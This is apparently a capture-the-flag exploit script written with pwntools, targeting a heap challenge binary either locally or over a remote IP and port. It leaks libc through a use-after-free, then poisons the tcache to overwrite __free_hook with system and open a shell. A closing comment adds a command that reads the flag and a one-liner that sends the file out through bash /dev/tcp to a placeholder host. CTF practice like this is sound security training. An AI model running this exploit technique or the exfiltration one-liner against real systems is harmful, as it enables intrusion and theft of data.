#!/usr/bin/env python3
'''
Pwn3d by pwn2ooown
'''
from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./chal_patched")
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

def add(sz, data):
    sla("> ","1")
    sla("> ",str(sz))
    sla("> ", data)
def remove(idx):
    sla("> ","2")
    sla("> ",str(idx))
def show(idx):
    sla("> ","3")
    sla("> ",str(idx))
def edit(idx, data):
    sla("> ","4")
    sla("> ",str(idx))
    sla("> ", data)
sla("hero?","y")
add(0x420,"aaa") #0
add(0x20,"bbb")#1
remove(0)
show(0)
ru("is: ")
libc = u64(r.recv(6).ljust(8,b"\x00")) - 0x1ecbe0
add(0x20,"ccc")#2
add(0x20,"ddd")#3
add(0x20,"eee")#4
remove(3)
remove(2)
free_hook = libc + 0x1eee48
system = libc + 0x52290
edit(2,p64(free_hook))
add(0x20,"/bin/sh")#5
add(0x20,p64(system))#6
remove(5)
leak("libc",hex(libc))


r.interactive()

'''
Writeup:
'''


'''
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
'''